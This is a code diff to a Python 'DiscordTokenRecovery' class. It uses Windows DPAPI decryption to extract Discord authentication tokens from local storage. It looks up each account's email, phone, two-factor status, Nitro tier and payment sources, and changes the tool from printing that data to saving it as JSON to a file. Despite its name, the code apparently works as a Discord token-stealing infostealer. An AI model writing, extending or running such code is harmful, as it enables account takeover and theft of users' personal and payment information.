@@ -1,4 +1,5 @@
 import os
+import json
 import re
 import logging
 import concurrent.futures
@@ -8,6 +9,7 @@ from Crypto.Util.Padding import unpad
 import win32crypt
 from win32crypt import CryptUnprotectData
 import requests
+from Utilities.DataSaver import DataSaverUtility
 
 logging.basicConfig(level=logging.INFO, format="%(message)s")
 
@@ -120,51 +122,67 @@ class DiscordTokenRecovery:
             "payment_sources": payment_sources
         }
 
-    def _print_tokens(self, tokens):
+    def _format_tokens(self, tokens):
+        """Format tokens and related data for saving."""
+        data_to_save = []
+        
         for token in tokens:
             uid = None
+            user_data_dict = {}
+            
             if not token.startswith("mfa."):
+                uid = None
                 try:
-                    uid = b64decode(token.split(".")[0].encode()).decode()
+                    # Ensure the Base64 string is correctly padded
+                    base64_string = token.split(".")[0]
+                    missing_padding = len(base64_string) % 4
+                    if missing_padding:
+                        padded_token = base64_string + '=' * (4 - missing_padding)
+                    else:
+                        padded_token = base64_string
+                            
+                    uid = b64decode(padded_token.encode()).decode()
                 except Exception as e:
                     logging.error(f"Base64 decoding error: {e}")
 
+                # Move the user data retrieval outside of the Base64 error handling
                 user_data = self.get_user_data(token)
-
-                print("═" * 26 + " Discord Token " + "═" * 27)
-                print(f"🔑 Token: {token}")
-                print(f"🪪  User ID: {uid}")
+                
+                user_data_dict["Type"] = "Discord Token"
+                user_data_dict["Token"] = token
+                user_data_dict["User ID"] = uid
                 if user_data:
-                    print(f"👤 Username: {user_data['username']}#{user_data['discriminator']}")
-                    print(f"📧 Email: {user_data['email']}")
-                    print(f"📞 Phone: {user_data['phone']}")
-                    print(f"🌐 Locale: {user_data['locale']}")
-                    print(f"🔐 Two-Factor Auth: {'Enabled' if user_data['mfa_enabled'] else 'Disabled'}")
+                    user_data_dict["Username"] = f"{user_data['username']}#{user_data['discriminator']}"
+                    user_data_dict["Email"] = user_data['email']
+                    user_data_dict["Phone"] = user_data['phone']
+                    user_data_dict["Locale"] = user_data['locale']
+                    user_data_dict["Two-Factor Auth"] = 'Enabled' if user_data['mfa_enabled'] else 'Disabled'
                     premium = {
                         0: "None",
                         1: "Nitro Classic",
                         2: "Nitro"
                     }.get(user_data['premium_type'], "Unknown")
-                    print(f"🌟 Premium: {premium}")
-
-                    # Printing payment sources
+                    user_data_dict["Premium"] = premium
+                    
+                    # Adding payment sources
                     if 'payment_sources' in user_data and user_data['payment_sources']:
-                        print("💵 Payment Sources:")
+                        user_data_dict["Payment Sources"] = []
                         for source in user_data['payment_sources']:
                             payment_type = {
                                 1: "Credit Card",
                                 2: "PayPal",
                             }.get(source['type'], "Unknown")
-                            print(f"   - Type: {payment_type} (Valid: {'Yes' if not source['invalid'] else 'No'})")
+                            user_data_dict["Payment Sources"].append(f"{payment_type} (Valid: {'Yes' if not source['invalid'] else 'No'})")
                     else:
-                        print("💵 No Valid Payment Sources Found")
-
-                print("═" * 68)
+                        user_data_dict["Payment Sources"] = "No Valid Payment Sources Found"
+                
+                data_to_save.append(user_data_dict)
             else:
-                print("═" * 68)
-                print(f"🔑 Token: {token}")
-                print("═" * 68)
+                data_to_save.append({"Type": "Discord Token", "Token": token})
 
+        # Convert the list of data dictionaries to JSON format
+        formatted_data = json.dumps(data_to_save, indent=4)
+        return formatted_data
 
     def extract_tokens(self, paths=PATHS.values()):
         tokens = []
@@ -177,4 +195,6 @@ class DiscordTokenRecovery:
                 except Exception as e:
                     logging.error(f"Error extracting tokens from {path}: {e}")
 
-        self._print_tokens(tokens)
+        # Use the utility to save the formatted tokens
+        formatted_data = self._format_tokens(tokens)
+        DataSaverUtility.save_to_file(formatted_data)
